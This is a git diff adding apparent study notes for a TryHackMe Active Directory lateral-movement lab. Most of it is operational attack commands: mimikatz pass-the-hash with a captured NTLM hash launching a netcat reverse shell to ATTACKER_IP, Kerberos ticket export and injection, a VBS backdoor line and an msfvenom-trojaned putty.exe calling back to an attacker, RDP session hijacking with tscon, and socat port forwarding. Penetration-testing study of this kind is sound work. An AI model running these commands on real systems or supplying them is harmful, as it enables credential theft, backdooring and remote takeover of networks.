@@ -18,6 +18,10 @@ This method will only allow you to get hashes from local users on the machine. N
 
 THMJMP2:
 Powershell
+
+
+NTLM Authentication
+
 mimikatz # privilege::debug
 mimikatz # token::elevate
 
@@ -46,3 +50,74 @@ SID               : S-1-5-21-3330634377-1326264276-632209373-4605
          * Username : bob.jenkins
          * Domain   : ZA
          * NTLM     : 6b4a57f67805a663c818106dc0648484
+
+
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+
+
+Kerberos Authentication
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+
+za\bob.jenkins@THMJMP2 C:\> klist
+
+Current LogonId is 0:0x1e43562
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ ZA.TRYHACKME.COM
+        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 4/12/2022 0:28:35 (local)
+        End Time:   4/12/2022 10:28:35 (local)
+        Renew Time: 4/23/2022 0:28:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called: THMDC.za.tryhackme.com
+
+
+Abusing Writable Shares
+One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.
+
+Backdooring .vbs Scripts
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+
+Backdooring .exe Files
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+
+
+RDP hijacking
+
+
+PsExec64.exe -s cmd.exe
+C:\> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
+ luke                                    3  Disc            .  4/6/2022 6:51 AM
+
+tscon 3 /dest:rdp-tcp#6
+
+
+Note: Windows Server 2019 won't allow you to connect to another user's session without knowing its password.
+
+
+SSH Tunnelling
+SSH Remote Port Forwarding
+SSH Local Port Forwarding
+Port Forwarding With socat
+Dynamic Port Forwarding and SOCKS
+
+socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+
+
+
+
+
+
+
+
